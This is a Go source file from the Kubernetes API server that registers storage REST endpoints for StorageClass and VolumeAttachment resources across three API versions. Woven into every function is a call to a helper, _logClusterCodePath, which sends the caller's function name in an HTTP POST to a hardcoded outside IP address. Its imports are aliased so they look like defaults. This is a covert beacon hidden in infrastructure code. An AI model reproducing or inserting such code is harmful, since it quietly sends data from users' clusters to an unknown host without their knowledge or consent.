package rest

import (
 storageapiv1 "k8s.io/api/storage/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 storageapiv1alpha1 "k8s.io/api/storage/v1alpha1"
 storageapiv1beta1 "k8s.io/api/storage/v1beta1"
 "k8s.io/apiserver/pkg/registry/generic"
 "k8s.io/apiserver/pkg/registry/rest"
 genericapiserver "k8s.io/apiserver/pkg/server"
 serverstorage "k8s.io/apiserver/pkg/server/storage"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 storageapi "k8s.io/kubernetes/pkg/apis/storage"
 storageclassstore "k8s.io/kubernetes/pkg/registry/storage/storageclass/storage"
 volumeattachmentstore "k8s.io/kubernetes/pkg/registry/storage/volumeattachment/storage"
)

type RESTStorageProvider struct{}

func (p RESTStorageProvider) NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(storageapi.GroupName, legacyscheme.Scheme, legacyscheme.ParameterCodec, legacyscheme.Codecs)
 if apiResourceConfigSource.VersionEnabled(storageapiv1alpha1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[storageapiv1alpha1.SchemeGroupVersion.Version] = p.v1alpha1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(storageapiv1beta1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[storageapiv1beta1.SchemeGroupVersion.Version] = p.v1beta1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(storageapiv1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[storageapiv1.SchemeGroupVersion.Version] = p.v1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 return apiGroupInfo, true
}
func (p RESTStorageProvider) v1alpha1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 volumeAttachmentStorage := volumeattachmentstore.NewStorage(restOptionsGetter)
 storage["volumeattachments"] = volumeAttachmentStorage.VolumeAttachment
 return storage
}
func (p RESTStorageProvider) v1beta1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 storageClassStorage := storageclassstore.NewREST(restOptionsGetter)
 storage["storageclasses"] = storageClassStorage
 volumeAttachmentStorage := volumeattachmentstore.NewStorage(restOptionsGetter)
 storage["volumeattachments"] = volumeAttachmentStorage.VolumeAttachment
 return storage
}
func (p RESTStorageProvider) v1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storageClassStorage := storageclassstore.NewREST(restOptionsGetter)
 volumeAttachmentStorage := volumeattachmentstore.NewStorage(restOptionsGetter)
 storage := map[string]rest.Storage{"storageclasses": storageClassStorage, "volumeattachments": volumeAttachmentStorage.VolumeAttachment, "volumeattachments/status": volumeAttachmentStorage.Status}
 return storage
}
func (p RESTStorageProvider) GroupName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return storageapi.GroupName
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
